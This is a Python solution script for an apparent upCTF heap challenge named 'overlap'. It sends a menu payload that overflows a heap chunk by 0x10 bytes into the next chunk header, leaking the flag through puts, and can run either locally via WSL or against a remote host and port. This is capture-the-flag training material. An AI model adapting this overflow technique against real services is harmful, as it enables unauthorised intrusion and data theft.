#!/usr/bin/env python3
import re
import socket
import subprocess
import sys
import time
from pathlib import Path


def build_payload(chunk_size: int = 64) -> bytes:
    # write_operation writes chunk_size + 0x10 bytes, so this overflows exactly
    # into the next chunk header and removes early NUL termination for puts.
    spray = b"A" * (chunk_size + 0x10)
    lines = [
        b"f",  # warm-up: consume one read_flag path to stabilize fopen allocations
        b"1",  # malloc
        str(chunk_size).encode(),
        b"f",  # hidden option: read_flag()
        b"4",  # write
        b"0",
        spray,
        b"3",  # read
        b"0",
        b"5",  # quit
    ]
    return b"\n".join(lines) + b"\n"


def run_local() -> str:
    target = Path("overlap")
    if not target.exists():
        raise FileNotFoundError("overlap binary not found in current directory")

    p = subprocess.run(
        ["wsl", "/bin/sh", "-lc", "./overlap"],
        input=build_payload(),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    out = p.stdout.decode("latin-1", errors="ignore")
    m = re.search(r"upCTF\{[^}]+\}", out)
    if m:
        return m.group(0)
    return out


def run_remote(host: str, port: int, timeout: float = 5.0) -> str:
    payload = build_payload()
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        # Give the service a moment to print the menu before sending scripted input.
        time.sleep(0.2)
        try:
            _ = s.recv(65535)
        except Exception:
            pass
        s.sendall(payload)

        chunks = []
        while True:
            try:
                data = s.recv(65535)
            except socket.timeout:
                break
            if not data:
                break
            chunks.append(data)

    out = b"".join(chunks).decode("latin-1", errors="ignore")
    m = re.search(r"upCTF\{[^}]+\}", out)
    if m:
        return m.group(0)
    return out


if __name__ == "__main__":
    if len(sys.argv) == 3:
        print(run_remote(sys.argv[1], int(sys.argv[2])))
    else:
        print(run_local())
